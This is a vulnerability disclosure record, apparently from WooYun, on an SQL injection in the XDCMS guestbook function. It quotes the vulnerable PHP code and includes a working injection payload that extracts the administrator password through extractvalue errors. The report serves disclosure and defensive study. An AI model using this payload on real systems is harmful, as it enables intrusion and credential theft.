{"id": 60091, "wybug_id": "wooyun-2013-044750", "wybug_title": "XDCMS企业管理系统SQL注入#3", "wybug_corp": "www.xdcms.cn", "wybug_author": "xfkxfk", "wybug_date": "2013-12-03 12:03", "wybug_open_date": "2014-03-03 12:04", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向公众公开  简要描述： 最新版XDCMS企业管理系统，由于过滤不严，可绕过限制，导致SQL注入 详细说明：  注入在XDCMS企业管理系统的在线留言功能处，来看看\\system\\modules\\form\\lists.php文件： \npublic function add_save(){\t\t$formid=safe_html($_GET['formid']);\t\t$form_arr=base::load_cache(\"cache_form\",\"_form\");\t\t$form=get_array($form_arr,'id',$formid,0);\t\t$fields=$_POST['fields']; //获取留言的内容，这里没有过滤\t\t$verifycode=$_POST['verifycode'];\t\t\t\t//验证码\t\t//if($form['0']['is_code']==1 && $verifycode!=$_SESSION['code']){\t\t//\tshowmsg(C('verifycode_error'),'-1');\t\t//}\t\t\t\tif(empty($fields['title'])||empty($formid)){\t\t\tshowmsg(C('material_not_complete'),'-1');\t\t}\t\t$form=formtable($formid);\t\tif(empty($form)){\t\t\tshowmsg(C('error'),'-1');\t\t}\t\t\t\t$table=$this->mysql->show_table();   //判断数据表是否存在\t\tif(!in_array(DB_PRE.$form,$table)){\t\t\tshowmsg(C('table_not_exist'),'-1');\t\t}\t\t//添加附加表\t\t$sql_fields='`inputtime`';\t\t$sql_value=datetime();\t\t$send_text='留言内容：<br>';\t\t                //问题就处在这，在处理留言内容时，过滤不严格可绕过，导致注入\t\tforeach($fields as $key=>$value){\t\t\t$sql_fields.=\",`\".safe_replace($key).\"`\";\t\t\tif(is_array($value)){\t\t\t\t$value_arr='';\t\t\t\tforeach($value as $k=>$v){\t\t\t\t\t$value_arr.=$v.',';\t\t\t\t}\t\t\t\t$value=$value_arr;\t\t\t}\t\t\t$sql_value.=\",\\\"\".safe_replace(safe_html($value)).\"\\\"\";\t\t\t$send_text.=safe_replace(safe_html($value)).\"<br>\";\t\t}\t\t$sql = \"insert into \".DB_PRE.$form.\"({$sql_fields}) values ({$sql_value})\";\t\t//echo $sql.\"\\n\";\t\t$this->mysql->query(\"insert into \".DB_PRE.$form.\"({$sql_fields}) values ({$sql_value})\");\t\t$rs=$this->mysql->get_one(\"select * from \".DB_PRE.\"form where id=\".$formid);\t\tif($rs['is_email']==1){\t\t\tsendmail('有人给您留言了！',$send_text);\t\t}\t\tshowmsg(C('add_success'),'-1');\t}}\n提交留言时会调用add_save，问题就出在这个add_save函数处：提交的内容是键值对，对键值都进行了safe_replace和safe_html过滤，但是在过滤key时，由于key是用反引号`进行引起来的，但是在过滤函数safe_html进行过滤是，没有过滤此反引号`，导致在key那里可以进行insert注入。   漏洞证明：  第一步进行在线留言：\n\n第二步，进行抓包，在key=content处加一个反引号`，发现报错了，说明存在注入\n\n第三步，我们来进行sql语句构造，在key那里插入EXP如下：\n`) values (1385992505,111111,111111,13111111111,111111,111111 and extractvalue(1, concat(0x5c,(select password from c_admin limit 1))));#\n\n\n第四步，成功得到管理员密码：\n\n   修复方案：  过滤严格   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-12-05 15:38 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}